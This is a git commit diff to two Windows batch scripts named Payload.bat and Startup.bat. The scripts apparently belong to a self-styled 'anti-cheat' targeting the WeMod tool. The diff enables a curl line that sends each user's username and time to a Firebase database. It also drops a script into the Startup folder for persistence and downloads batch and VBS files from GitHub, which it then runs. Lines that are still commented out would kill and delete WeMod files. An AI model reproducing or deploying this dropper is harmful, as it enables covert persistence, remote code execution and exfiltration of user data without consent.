673658faf0ddbffabe0d06bdb632f543dc13dfd1
DrMeepso <50252724+DrMeepso@users.noreply.github.com>
2021-11-08 19:01:18 +1300

    12

--- Payload.bat
+++ Payload.bat
@@ -1,11 +1,7 @@
 @echo off
 set dir = C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat
 
-rem taskkill /IM WeMod.exe /F > nul
-rem del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
-rem del C:\Users\%username%\AppData\Local\WeMod\Update.exe
-rem del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
-rem curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json
+curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
 md C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat
--- Startup.bat
+++ Startup.bat
@@ -1,5 +1,7 @@
+md C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat
 cd C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat
 curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Scalpel.bat -o Scalpel.bat
+curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/ScalpelStart.vbs -o start.vbs
 
-    start start.vbs
+start start.vbs
 exit
